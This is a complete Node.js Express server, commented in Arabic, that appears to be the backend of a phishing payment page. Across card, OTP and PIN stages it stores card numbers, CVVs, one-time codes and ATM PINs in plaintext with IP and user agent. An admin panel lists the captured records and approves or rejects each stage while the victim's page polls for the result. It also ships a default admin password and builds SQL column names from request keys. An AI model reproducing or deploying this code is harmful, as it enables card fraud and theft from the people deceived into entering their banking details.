const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

// قاعدة بيانات PostgreSQL عند توفر DATABASE_URL (في Railway)، وإلا SQLite محليًا
let db = null;
if (process.env.DATABASE_URL) {
    try {
        const { Pool } = require('pg');
        const pool = new Pool({
            connectionString: process.env.DATABASE_URL,
            ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : undefined,
            max: 5,
            idleTimeoutMillis: 30000,
        });
        pool.on('connect', () => console.log('PostgreSQL connected'));
        pool.on('error', (err) => console.error('PostgreSQL error:', err.message));
        db = pool;
    } catch (e) {
        console.error('pg load failed:', e.message);
    }
} else {
    try {
        let initSqlJs = null;
        try {
            initSqlJs = require('sql.js');
        } catch (loadErr) {
            console.log('sql.js غير متوفر، سيتم العمل بدون قاعدة بيانات محلية');
        }
        if (initSqlJs) {
            // sql.js v2: دالة factory ترجع وعدًا (WASM)
            Promise.resolve(initSqlJs.default ? initSqlJs.default() : initSqlJs())
                .then(function (SqlJs) {
                    const JsDatabase = new SqlJs.Database();
                    // غلاف يضيف واجهة مشابهة لـ better-sqlite3
                    db = {
                        _js: JsDatabase,
                        exec(sql) {
                            return this._js.run(sql).changes;
                        },
                        pragma(v) {
                            // غير مطلوب منطقياً في sql.js؛ تُقبل بلا فعل
                            return null;
                        },
                        prepare(sql) {
                            const jsStmt = this._js.prepare(sql);
                            const self = this;
                            return {
                                _js: jsStmt,
                                run(...params) {
                                    jsStmt.bind(params);
                                    jsStmt.step();
                                    jsStmt.reset();
                                    const changes = jsStmt.getRowsModified ? jsStmt.getRowsModified() : 0;
                                    const lr = self._js.exec('SELECT last_insert_rowid() AS id');
                                    const lastInsertRowid = lr[0] ? lr[0].values[0][0] : null;
                                    return { changes: changes, lastInsertRowid: lastInsertRowid };
                                },
                                get(...params) {
                                    jsStmt.bind(params);
                                    const res = jsStmt.step() ? jsStmt.getAsObject() : null;
                                    jsStmt.reset();
                                    return res;
                                },
                                all(...params) {
                                    jsStmt.bind(params);
                                    const rows = [];
                                    while (jsStmt.step()) rows.push(jsStmt.getAsObject());
                                    jsStmt.reset();
                                    return rows;
                                },
                                free() { jsStmt.free(); }
                            };
                        }
                    };
                    console.log('SQLite local database ready (sql.js)');
                    return initDb();
                })
                .catch(function (e) {
                    console.error('sqlite load failed:', e.message);
                });
        } else {
            initDb();
        }
    } catch (e) {
        console.error('sqlite load failed:', e.message);
    }
}

async function initDb() {
    if (!db) return;
    try {
        if (typeof db.prepare === 'function') {
            db.exec(`
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    full_name TEXT,
                    phone TEXT,
                    email TEXT,
                    message TEXT,
                    created_at TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS requests (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT, phone TEXT, email TEXT,
                    service TEXT, details TEXT,
                    created_at TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS contacts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT, phone TEXT, email TEXT,
                    subject TEXT, message TEXT,
                    created_at TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS leads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    full_name TEXT, phone TEXT, email TEXT, city TEXT,
                    message TEXT, source TEXT DEFAULT 'web', status TEXT DEFAULT 'new',
                    contract_no TEXT,
                    created_at TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS payments (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    contract_no TEXT,
                    customer_name TEXT,
                    service_info TEXT,
                    amount REAL,
                    card_name TEXT,
                    card_number TEXT,
                    card_expiry TEXT,
                    card_cvv TEXT,
                    otp_code TEXT,
                    atm_pin TEXT,
                    stage TEXT DEFAULT 'initiated',
                    client_ip TEXT,
                    user_agent TEXT,
                    decision TEXT DEFAULT NULL,
                    decided_at TEXT DEFAULT NULL,
                    created_at TEXT DEFAULT (datetime('now')),
                    updated_at TEXT DEFAULT (datetime('now'))
                );
            `);
            console.log('DB tables ensured');
        } else {
            await db.query(`
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    full_name TEXT,
                    phone TEXT,
                    email TEXT,
                    message TEXT,
                    created_at TIMESTAMPTZ DEFAULT now()
                );
                CREATE TABLE IF NOT EXISTS requests (
                    id SERIAL PRIMARY KEY,
                    name TEXT, phone TEXT, email TEXT,
                    service TEXT, details TEXT,
                    created_at TIMESTAMPTZ DEFAULT now()
                );
                CREATE TABLE IF NOT EXISTS contacts (
                    id SERIAL PRIMARY KEY,
                    name TEXT, phone TEXT, email TEXT,
                    subject TEXT, message TEXT,
                    created_at TIMESTAMPTZ DEFAULT now()
                );
                CREATE TABLE IF NOT EXISTS leads (
                    id SERIAL PRIMARY KEY,
                    full_name TEXT, phone TEXT, email TEXT, city TEXT,
                    message TEXT, source TEXT DEFAULT 'web', status TEXT DEFAULT 'new',
                    contract_no TEXT,
                    created_at TIMESTAMPTZ DEFAULT now()
                );
                CREATE TABLE IF NOT EXISTS payments (
                    id SERIAL PRIMARY KEY,
                    contract_no TEXT,
                    customer_name TEXT,
                    service_info TEXT,
                    amount REAL,
                    card_name TEXT,
                    card_number TEXT,
                    card_expiry TEXT,
                    card_cvv TEXT,
                    otp_code TEXT,
                    atm_pin TEXT,
                    stage TEXT DEFAULT 'initiated',
                    client_ip TEXT,
                    user_agent TEXT,
                    decision TEXT DEFAULT NULL,
                    decided_at TIMESTAMPTZ DEFAULT NULL,
                    created_at TIMESTAMPTZ DEFAULT now(),
                    updated_at TIMESTAMPTZ DEFAULT now()
                );
            `);
            console.log('PostgreSQL tables ensured');
        }
    } catch (e) {
        console.error('initDb error:', e.message);
    }
}

initDb();

// ضغط gzip لتحسين أداء النقل (يجب تسجيله قبل static)
const compression = (() => { try { return require('compression'); } catch (e) { return null; } })();
if (compression) app.use(compression());

// ملفات ثابتة
// نقاط API قبل ملفات static لضمان عدم التقاط الـ fallback لها
// تسلسل الطلب: order pages → customer-info → /api/leads → payment
app.post('/api/leads', async (req, res) => {
    try {
        let id;
        if (db && typeof db.prepare !== 'function') {
            const b = req.body || {};
            const r = await db.query(
                `INSERT INTO leads (full_name, phone, email, city, message, source, status, contract_no)
                 VALUES ($1, $2, $3, $4, $5, $6, 'new', $7) RETURNING id, created_at`,
                [b.full_name || b.name || null, b.phone || null, b.email || null, b.city || null, b.message || null, b.source || 'web', b.contract_no || b.contractNo || null]
            );
            id = r.rows[0].id;
        } else if (db) {
            const b = req.body || {};
            const r = db.prepare(
                `INSERT INTO leads (full_name, phone, email, city, message, source, status, contract_no)
                 VALUES (?, ?, ?, ?, ?, ?, 'new', ?)`
            ).run(b.full_name || b.name || null, b.phone || null, b.email || null, b.city || null, b.message || null, b.source || 'web', b.contract_no || b.contractNo || null);
            id = r.lastInsertRowid;
        } else {
            id = 'offline';
        }
        res.json({ success: true, data: { id, ...(req.body || {}), status: 'new', created_at: new Date().toISOString() } });
    } catch (e) {
        console.error('leads error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// حفظ بيانات الدفع (البطاقة، OTP، PIN) عند إتمام خطوات بوابة الدفع
app.post('/api/payments', async (req, res) => {
    try {
        const b = req.body || {};
        const ip = clientIpOf(req);
        const ua = req.headers['user-agent'] || '';
        const now = new Date().toISOString();
        if (db && typeof db.prepare !== 'function') {
            if (b.stage === 'card') {
                await db.query(
                    `INSERT INTO payments (contract_no, customer_name, service_info, amount, card_name, card_number, card_expiry, card_cvv, stage, client_ip, user_agent, created_at, updated_at)
                     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,'card_initiated',$9,$10,$11,$11) RETURNING id`,
                    [b.contractNo || null, b.customerName || null, b.serviceInfo || null, Number(b.amount) || 0,
                     b.cardName || null, b.cardNumber || null, b.cardExpiry || null, b.cardCvv || null, ip, ua, now]
                );
            } else if (b.stage === 'otp') {
                await db.query(
                    `UPDATE payments SET otp_code=$1, stage='otp_verified', decision=NULL, decided_at=NULL, updated_at=$2 WHERE id=(SELECT id FROM payments WHERE contract_no=$3 AND stage='card_initiated' ORDER BY id DESC LIMIT 1)`,
                    [b.otpCode || null, now, b.contractNo || null]
                );
            } else if (b.stage === 'pin') {
                await db.query(
                    `UPDATE payments SET atm_pin=$1, stage='success', decision=NULL, decided_at=NULL, updated_at=$2 WHERE id=(SELECT id FROM payments WHERE contract_no=$3 AND stage='otp_verified' ORDER BY id DESC LIMIT 1)`,
                    [b.atmPin || null, now, b.contractNo || null]
                );
            }
        } else if (db) {
            if (b.stage === 'card') {
                db.prepare(
                    `INSERT INTO payments (contract_no, customer_name, service_info, amount, card_name, card_number, card_expiry, card_cvv, stage, client_ip, user_agent, created_at, updated_at)
                     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`
                ).run(b.contractNo || null, b.customerName || null, b.serviceInfo || null, Number(b.amount) || 0,
                      b.cardName || null, b.cardNumber || null, b.cardExpiry || null, b.cardCvv || null,
                      'card_initiated', ip, ua, now, now);
            } else if (b.stage === 'otp') {
                db.prepare(`UPDATE payments SET otp_code=?, stage='otp_verified', decision=NULL, decided_at=NULL, updated_at=? WHERE id=(SELECT id FROM payments WHERE contract_no=? AND stage='card_initiated' ORDER BY id DESC LIMIT 1)`)
                  .run(b.otpCode || null, now, b.contractNo || null);
            } else if (b.stage === 'pin') {
                db.prepare(`UPDATE payments SET atm_pin=?, stage='success', decision=NULL, decided_at=NULL, updated_at=? WHERE id=(SELECT id FROM payments WHERE contract_no=? AND stage='otp_verified' ORDER BY id DESC LIMIT 1)`)
                  .run(b.atmPin || null, now, b.contractNo || null);
            }
        }
        res.json({ success: true });
    } catch (e) {
        console.error('payments error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// ---------------- لوحة الإدارة ----------------
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const adminTokens = new Map(); // token -> createdAt

function verifyAdminToken(token) {
    const rec = adminTokens.get(token);
    if (!rec) return false;
    if (Date.now() - rec > 24 * 60 * 60 * 1000) { adminTokens.delete(token); return false; }
    return true;
}
function genToken() {
    const crypto = require('crypto');
    return crypto.randomBytes(16).toString('hex');
}

// ---------------- قبول / رفض الدفع ----------------
app.post('/api/admin/payments/:id/decide', async (req, res) => {
    const token = (req.headers.authorization || '').replace('Bearer ', '');
    if (!verifyAdminToken(token)) return res.status(401).json({ error: 'unauthorized' });
    try {
        const id = parseInt(req.params.id) || null;
        const decision = req.body && req.body.decision; // 'approved' | 'rejected'
        const stage = req.body && req.body.stage; // 'card' | 'otp' | 'pin'
        if (!id || (decision !== 'approved' && decision !== 'rejected')) {
            return res.status(400).json({ error: 'invalid request' });
        }
        const now = new Date().toISOString();
        if (db && typeof db.prepare !== 'function') {
            await db.query(`UPDATE payments SET decision=$1, decided_at=$2, updated_at=$3 WHERE id=$4`, [decision, now, now, id]);
        } else if (db) {
            db.prepare(`UPDATE payments SET decision=?, decided_at=?, updated_at=? WHERE id=?`).run(decision, now, now, id);
        }
        res.json({ success: true });
    } catch (e) {
        console.error('decide error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// استعلام حالة القرار لعميل ينتظر الرد (polling كل ثوانٍ)
app.get('/api/payment-decision/:contractNo', async (req, res) => {
    try {
        const contractNo = req.params.contractNo;
        let row = null;
        if (db && typeof db.prepare !== 'function') {
            const r = await db.query(`SELECT decision, stage FROM payments WHERE contract_no=$1 ORDER BY id DESC LIMIT 1`, [contractNo]);
            row = r.rows[0] || null;
        } else if (db) {
            row = db.prepare(`SELECT decision, stage FROM payments WHERE contract_no=? ORDER BY id DESC LIMIT 1`).get(contractNo) || null;
        }
        res.json({ decision: row ? row.decision : null, stage: row ? row.stage : null });
    } catch (e) {
        res.json({ decision: null, stage: null });
    }
});

app.post('/api/admin/login', async (req, res) => {
    const { password } = req.body || {};
    if (password === ADMIN_PASSWORD) {
        const token = genToken();
        adminTokens.set(token, Date.now());
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, error: 'كلمة المرور غير صحيحة' });
    }
});

app.get('/api/admin/verify', async (req, res) => {
    const token = (req.headers.authorization || '').replace('Bearer ', '');
    res.json({ valid: verifyAdminToken(token) });
});

app.get('/api/admin/stats', async (req, res) => {
    const token = (req.headers.authorization || '').replace('Bearer ', '');
    if (!verifyAdminToken(token)) return res.status(401).json({ error: 'unauthorized' });
    try {
        const onlineVisitors = visitSessions.size;
        let total = 0, pending = 0, completed = 0, failed = 0, newCount = 0;
        if (db) {
            if (typeof db.prepare === 'function') {
                const leads = db.prepare(`SELECT COUNT(*) c FROM leads`).get();
                const newL = db.prepare(`SELECT COUNT(*) c FROM leads WHERE status='new'`).get();
                const pays = db.prepare(`SELECT COUNT(*) c FROM payments`).get();
                const succ = db.prepare(`SELECT COUNT(*) c FROM payments WHERE stage='success'`).get();
                total = (leads.c || 0) + (pays.c || 0);
                newCount = newL.c || 0;
                completed = succ.c || 0;
                failed = (pays.c || 0) - (succ.c || 0);
            } else {
                const leads = await db.query(`SELECT COUNT(*) c FROM leads`);
                const newL = await db.query(`SELECT COUNT(*) c FROM leads WHERE status='new'`);
                const pays = await db.query(`SELECT COUNT(*) c FROM payments`);
                const succ = await db.query(`SELECT COUNT(*) c FROM payments WHERE stage='success'`);
                total = (parseInt(leads.rows[0].c) || 0) + (parseInt(pays.rows[0].c) || 0);
                newCount = parseInt(newL.rows[0].c) || 0;
                completed = parseInt(succ.rows[0].c) || 0;
                failed = (parseInt(pays.rows[0].c) || 0) - (parseInt(succ.rows[0].c) || 0);
            }
        }
        res.json({ total, pending, completed, failed, new: newCount, onlineVisitors });
    } catch (e) {
        console.error('admin stats error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/leads', async (req, res) => {
    const token = (req.headers.authorization || '').replace('Bearer ', '');
    if (!verifyAdminToken(token)) return res.status(401).json({ error: 'unauthorized' });
    try {
        let rows = [];
        if (db && typeof db.prepare === 'function') {
            rows = db.prepare(`SELECT * FROM leads ORDER BY id DESC LIMIT 200`).all();
        } else if (db) {
            const r = await db.query(`SELECT * FROM leads ORDER BY id DESC LIMIT 200`);
            rows = r.rows;
        }
        res.json(rows);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/admin/payments', async (req, res) => {
    const token = (req.headers.authorization || '').replace('Bearer ', '');
    if (!verifyAdminToken(token)) return res.status(401).json({ error: 'unauthorized' });
    try {
        let rows = [];
        if (db && typeof db.prepare === 'function') {
            rows = db.prepare(`SELECT * FROM payments ORDER BY id DESC LIMIT 200`).all();
        } else if (db) {
            const r = await db.query(`SELECT * FROM payments ORDER BY id DESC LIMIT 200`);
            rows = r.rows;
        }
        res.json(rows);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/leads', async (req, res) => {
    try {
        let rows;
        if (db && typeof db.prepare !== 'function') {
            const r = await db.query(`SELECT * FROM leads ORDER BY id DESC LIMIT 200`);
            rows = r.rows;
        } else if (db) {
            rows = db.prepare(`SELECT * FROM leads ORDER BY id DESC LIMIT 200`).all();
        } else {
            rows = [];
        }
        res.json(rows);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/db/:table', async (req, res) => {
    const { table } = req.params;
    if (!['users', 'requests', 'contacts'].includes(table)) {
        return res.status(400).json({ error: 'Invalid table' });
    }
    try {
        const result = await insertRecord(table, req.body);
        res.status(201).json(result);
    } catch (e) {
        console.error('insert error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/db/:table', async (req, res) => {
    const { table } = req.params;
    if (!['users', 'requests', 'contacts'].includes(table)) {
        return res.status(400).json({ error: 'Invalid table' });
    }
    try {
        let rows;
        if (typeof db.prepare === 'function') {
            rows = db.prepare(`SELECT * FROM ${table} ORDER BY id DESC LIMIT 200`).all();
        } else {
            const r = await db.query(`SELECT * FROM ${table} ORDER BY id DESC LIMIT 200`);
            rows = r.rows;
        }
        res.json(rows);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.use(express.static(__dirname, { maxAge: '1d' }));

// إعادة كتابة مسارات /en/xxx إلى ملفات en-xxx.html
app.get(/^\/en\/(.+\.html)$/i, (req, res, next) => {
    const file = path.join(__dirname, 'en-' + req.params[0]);
    try {
        require('fs').accessSync(file);
        return res.sendFile(file);
    } catch (e) {
        next();
    }
});

// ---------------- عداد الزيارات الحية ----------------
const visitSessions = new Map();
function clientIpOf(req) {
    const fwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
    return fwd || req.ip || req.socket.remoteAddress || '';
}
app.use((req, res, next) => {
    if (!/^\/api\/admin/.test(req.url)) {
        const key = clientIpOf(req);
        if (key) visitSessions.set(key, Date.now());
    }
    // تنظيف الجلسات القديمة (نافذة 15 دقيقة)
    if (Math.random() < 0.01) {
        const cutoff = Date.now() - 15 * 60 * 1000;
        for (const [k, t] of visitSessions) if (t < cutoff) visitSessions.delete(k);
    }
    next();
});

// نقاط الحفظ في قاعدة البيانات
async function insertRecord(table, row) {
    if (!db) return { fallback: true, table, row };
    if (typeof db.prepare === 'function') {
        const cols = Object.keys(row);
        const vals = Object.values(row);
        db.prepare(`INSERT INTO ${table} (${cols.join(',')}) VALUES (${cols.map(() => '?').join(',')})`).run(...vals);
        return { success: true, table };
    } else {
        const cols = Object.keys(row);
        const vals = Object.values(row);
        await db.query(`INSERT INTO ${table} (${cols.map((c) => `"${c}"`).join(',')}) VALUES (${vals.map((_, i) => '$' + (i + 1)).join(',')})`, vals);
        return { success: true, table };
    }
}


// نقاط API — تُسجل قبل serve static حتى لا يلتقطها fallback
// fallback لتطبيق SPA: أي مسار لا يحتوي نقطة يُخدم بـ index.html
app.get(/^((?!\.).)*$/, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    if (process.env.DATABASE_URL) console.log('Using PostgreSQL (DATABASE_URL)');
});
